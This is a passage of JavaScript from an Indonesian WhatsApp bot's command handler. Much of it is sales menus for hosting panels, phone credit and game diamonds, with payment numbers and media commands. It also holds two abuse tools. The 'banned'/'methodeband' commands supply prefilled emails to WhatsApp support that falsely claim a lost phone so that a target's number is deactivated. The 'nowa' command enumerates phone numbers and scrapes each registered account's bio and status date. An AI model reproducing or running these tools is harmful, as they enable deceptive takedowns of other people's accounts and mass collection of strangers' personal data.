📮 *Paket G1*
RAM 1GB CPU 25%
10K/Bulan
📮 *Paket G2*
RAM 2GB CPU 50%
15K/Bulan
📮 *Paket G3*
RAM 3GB CPU 75%
20K/Bulan
📮 *Paket G4*
RAM 4GB CPU 100%
25K/Bulan
📮 *Paket G5*
RAM 5GB CPU 125%
30K/Bulan
📮 *Paket G6*
RAM 6GB CPU 150%
35K/Bulan
📮 *Paket G7*
RAM 7GB CPU 175%
40K/Bulan

📮 _*1-3 GB Perpanjangan Mas Aktif Diskon 5K*_
📮 _*4-7 GB Perpanjangan Mas Aktif Diskon 10K*_

*[ Administrator ]*
wa.me/6285608484711`)
}
break
//=================================================//
case 'pulsa': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Pulsa All Operator
Silahkan Ketik Nominal Nya
pulsa > harga
________________
.5.000 > 7k
.10.000 > 12k
.15.000 > 16k
.20.000 > 22k
.25.000 > 25k
.30.000 > 31k
.50.000 > 51k
.100.000 > 99k
.150.000 > 147k
.200.000 > 195k`)
}
break
//=================================================//
case 'payment': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
//=================================================//
case 'tutorial': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Tutorial Run Via Panel
https://youtu.be/rqqxkI4P8YY`)
}
break
//=================================================//
case '5000': case '7k':{
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6285608484711?text=Beli+Pulsa+Mas+Yang+5000

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
case '10000': case '12k': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6285608484711?text=Beli+Pulsa+Mas+Yang+10000

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
case '15000': case '16k': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6285608484711?text=Beli+Pulsa+Mas+Yang+15000

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
case '20000': case '22k': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6285608484711?text=Beli+Pulsa+Mas+Yang+20000

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
case '25000': case '25k': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6285608484711?text=Beli+Pulsa+Mas+Yang+25000

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
case '30000': case '31k': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6285608484711?text=Beli+Pulsa+Mas+Yang+300000

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
case '50000': case '51k': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6285608484711?text=Beli+Pulsa+Mas+Yang+50000

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
case '100000': case'99k':{
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6285608484711?text=Beli+Pulsa+Mas+Yang+100000

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
case '150000': case '147k':{
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6285608484711?text=Beli+Pulsa+Mas+Yang+150000

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
case '200000': case '195k':{
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6285608484711?text=Beli+Pulsa+Mas+Yang+200000

Raditya Agil S
gopay : 085608484711
Dana : 085730794089
Ovo : 085608484711`)
}
break
//=================================================//
case 'belajarkita': {
if (!isRegistered) return replyReg(mess.verif)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ah3W96XRKFP1U7LSM1DvTeP81MpC75EBgDUYYQt9B5mF.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Belajar Bersama_1.11.apk",
"fileSha256": "PdBsdG3dTVg+CAiJJzqlcU/Wc1DHAloGQKV0n5vo30s=",
"fileLength": "7249993",
"pageCount": 0,
"mediaKey": "wnhI3PodfZqLKQbbEBQFYBxlb7n1WBhwWbPfuPQJm/8=",
"fileName": "Belajar Bersama_1.11.apk",
"fileEncSha256": "LAmKijY7XCKJrONV0cBXPiCNVYJdYLMjMOsi+q4pd2g=",
"directPath": "/v/t62.7119-24/34960356_543134977691326_1792059771773909536_n.enc?ccb=11-4&oh=01_AdQHN60wPp2-oLvINncKbeOse99hDWzyfjN2G4S0G4kr1g&oe=63C591FA",
"mediaKeyTimestamp": "1671207354",
"caption": "Hallo Kak Aplikasi Ini Adalah Buatan Asli Hw Mods Aman Dan Terpercaya Selamat Belajar ❤️",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply('sukses Kirim Script')
}
break
//=================================================//
case 'jasarun': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Hello Kamu Malas Upload Script Ke Panel??
Atauu.. Bingung Yah Tenang Ada Kami Jasa Run Bot Via Panel
Kalian Bisa Hubungi Owner Di Bawah..
Harga Tergantung Setiap Owner 😉

Gilzzxy-
Wa.me/6285608484711?text=Bang+Jasa+Run

Nanz-
Wa.me/6289643559747?text=Bang+Jasa+Run

Ido-
Wa.me/6285649455626?text=Bang+Jasa+Run`)
}
break
//=================================================//
case 'bagaimanakah':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:m })
break
//=================================================//
 case 'apakah':
 if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
break
//=================================================//

//=================================================//
case 'detectadmin': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
m.reply('Succes menyalakan detect admin di group ini 🌷')
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Mati')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Succes mematikan detect admin di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

//=================================================//
case 'nowa': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('lah?')
reply(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await haikal.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
case 'jualan':
touchmebree = [
{
title: `©️ HW MODS WA`,
rows: [
{title: `PANEL`, rowId: `${prefix}panel`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `SCRIPT BOT 30k`, rowId: `${prefix}skrip`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `DIAMOND ML`, rowId: `${prefix}diamond`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `PEMBAYARAN`, rowId: `${prefix}payment`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WHATSAPP`, rowId: `${prefix}whatsapp`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `JAS RUN BOT`, rowId: `${prefix}jasarun`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `NODE MODULES`, rowId: `${prefix}nodemodules`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `PULSA`, rowId: `${prefix}pulsa`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`}
]
}
]
haikal.sendListMsg(m.chat, `
Aku Menjual Berbagai Kebutuhan Seperti
- WhatsApp Mods Imune
- Script Bot Whatsapp
- Diamond Mobile Legends
- Pulsa All Operator
- Panel Untuk Hosting Bot
- Jas Running Bot

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Jualan Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
//=================================================//
case 'listwibu':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
touchmebree = [
{
title: `©️ HW MODS WA`,
rows: [
{title: `WIBU 1`, rowId: `${prefix}kill`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `WIBU 2`, rowId: `${prefix}pat`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 3`, rowId: `${prefix}lick`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 4`, rowId: `${prefix}yeet`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 5`, rowId: `${prefix}bite`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 6`, rowId: `${prefix}wink`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 7`, rowId: `${prefix}poke`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 8`, rowId: `${prefix}nom`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 9`, rowId: `${prefix}slap`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 10`, rowId: `${prefix}smile`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 11`, rowId: `${prefix}wave`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 12`, rowId: `${prefix}blush`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 13`, rowId: `${prefix}smug`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 14`, rowId: `${prefix}glomp`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 15`, rowId: `${prefix}happy`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 16`, rowId: `${prefix}dance`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 17`, rowId: `${prefix}cringe`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 18`, rowId: `${prefix}highfive`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 19`, rowId: `${prefix}handhold`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `WIBU 20`, rowId: `${prefix}bonk`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`}
]
}
]
haikal.sendListMsg(m.chat, `
 Menyediakan Gambar Gratis Untuk Kalian Mau
Total 300 Gambar Dalam 
20 Command, Dengan Picture Yang Berbeda 🤝


Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Wibu Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
//=================================================//
case 'assalamualaikum': case 'p': case 'bang': case 'kal': {
reply(`Waalaikumsalam`)
}
break
//=================================================//
case 'banned': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `BANNED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` HW MODS WA`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `BANNED`, url: 'mailto:support@whatsapp.com?Body=Hello,%20please%20deactivate%20this%20number,%20because%20I%20have%20lost%20my%20cellphone%20and%20someone%20is%20using%20my%20number,%20please%20deactivate%20my%20number:%2B+62xxxxxx'}}],
headerType: 1
}
haikal.sendMessage(m.chat, message, { quoted:m })
}
break
//=================================================//
case 'unbaned': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `UNBANED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` HW MODS WA`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `UNBANED`, url: 'mailto:support@whatsapp.com?Body=Please%20reactivate%20my%20number%20because%20I%20didnt%20violate%20any%20WhatsApp%20rules,%20suddenly%20my%20number%20was%20banned,%20please%20reactivate%20this%20number:%2B+62xxxxxxx%20because%20I%20didnt%20do%20anything%20wrong,%20suddenly%20my%20number%20was%20banned%20when%20I%20entered%20the%20group%20so%20I%20ask%20the%20respectable%20WhatsApp%20party,%20please%20reactivate%20my%20number,%20thank%20you'}}],
headerType: 1
}
haikal.sendMessage(m.chat, message, { quoted:m })
}
break
//=================================================//
case 'resetverif': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `UNBANED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` HW MODS WA`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `RESET CODE`, url: 'mailto:support@whatsapp.com?Body=Please%20research%20the%20OTP%20code%20for%20this%20number%20because%20someone%20else%20accidentally%20logged%20in%20with%20my%20number%20and%20I%20had%20to%20wait%208%20hours,%20please%20research%20again%20at%20this%20number:%2B+62xxxxx'}}],
headerType: 1
}
haikal.sendMessage(m.chat, message, { quoted:m })
}
break
//=================================================//
case 'methodeband':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
touchmebree = [
{
title: `©️ HW MODS WA`,
rows: [
{title: `BANNED`, rowId: `${prefix}banned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `UNBANED`, rowId: `${prefix}unbaned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `RESET CODE`, rowId: `${prefix}resetverif`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(m.chat, `
Hii Guys Aku Menyediakan Methode Ban Menggunakan Gmail 🥳
Dan Ini Tidak Akan Selalu Tepat Sasaran Hanya Akan Berlaku Jika Si Target Memang Betul Telah Melukan Kesalahan Dalam Ketentuan layanan Komunitas WhatsApp

© WhatsApp LLC

Semoga Kalian Suka 🥳`, VynaaBotz.user.name, `Hay Kak List Ban Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
//=================================================//
case 'oke': case 'anjing': case 'anjay': case 'ajg': case 'thx': case 'thanks' : case 'makasih': case 'mksh': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AvpcNTnCiFuwMOTF_4M-_pQul6OGHttQt9mT-ELnqRGi.enc",
"mimetype": "audio/mpeg",
"fileSha256": "voiw4MmXNUd1ZZ6Phtz5wuIuVVteGLpHbM25ELh8M3I=",
"fileLength": "590156",
"seconds": 38,
"ptt": true,
"mediaKey": "pTTV3QeU+tHQ0QxSLQcxT+N8Z4aNDdNGQEWD3Ek5BAk=",
"fileEncSha256": "7H3yGsETGrNYNXKOiRRrv7sJkh72KmHlqc6fr4iwMlU=",
"directPath": "/v/t62.7114-24/30633446_677011363892883_1835941796065619727_n.enc?ccb=11-4&oh=01_AdRoORpHvya9BbHrVj0kEow0V5brcP3h3uTX7VgNUFtIUw&oe=63D1F365",
"mediaKeyTimestamp": "1672112575",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
case 'diamond': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

*Pricelist DM Mobile Legends By Shuro Store* :

14💎(13+1) Rp3.800,00
56💎(51+5) Rp14.500,00
86💎(78+8) Rp21.700,00
114💎(104+10) Rp27.900,00
172💎(156+16) Rp41.500,00
257💎(234+23) Rp60.600,00
285💎(260+25) Rp67.000,00
344💎(312+32) Rp80.500,00
429💎(390+39) Rp99.700,00
514💎(468+46) Rp119.000,00
570💎(519+51) Rp134.500,00
600💎(546+54) Rp138.800,00
720💎(638+82) Rp161.800,00
878💎(781+97) Rp198.500,00
963💎(859+104) Rp218.000,00
1.163💎(1041+122) Rp265.600,00
2.195💎(1860+335) Rp472.000,00
2.901💎(2485+416) Rp629.300,00
3.688💎(3099+589) Rp785.500,00
4.394💎(3724+670) Rp942.900,00
5.532💎(4649+883) Rp1.180.000,00

Noted :
Order dengan memberikan ID+Server
Silahkan Hubungi Owner Di Bawah

Gilzzxy-
Wa.me/6282389924037?text=Bang+Beli+Diamond

Buaya Bayangan-
Wa.me/6282389924037?text=Bang+Beli+Diamond`)
}
break
//=================================================//
case 'igdl':
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
var url = data.result[0]
if (url.includes('.mp4')) {
haikal.sendMessage(from, { video: { url }, mimetype: 'video/mp4' })
} else {
haikal.sendMessage(from, { image: { url } })
}
})
break
case 'igdl2':
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
for (var x of data.result) {
if (x.includes('.mp4')) {
haikal.sendMessage(from, { video: { url: x }, mimetype: 'video/mp4' })
} else {
haikal.sendMessage(from, { image: { url: x } })
}
}
})
break
case 'twtdl':
if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
axios.get(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
haikal.sendMessage(from, { video: { url: data.result.link[data.result.link.length - 1].link }, mimetype: 'video/mp4' })
})
break
case 'fbdl':
if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
haikal.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4' })
})
break
case 'hw1': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw1,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw2': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw2,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw3': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw3,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw4': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw4,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw5': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw5,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw6': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw6,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw7': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw7,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw8': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw8,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw9': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw9,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw10': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw10,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw11': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw11,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw12': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw12,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw13': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw13,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw14': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw14,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw15': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw15,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw16': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw16,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw17': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw17,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw18': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw18,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw19': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw19,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw20': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw20,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw21': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw21,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw22': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw22,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw23': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw23,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw24': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw24,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw25': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw25,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw26': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw26,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw27': {
if (!isRegistered) return replyReg(mess.verif)
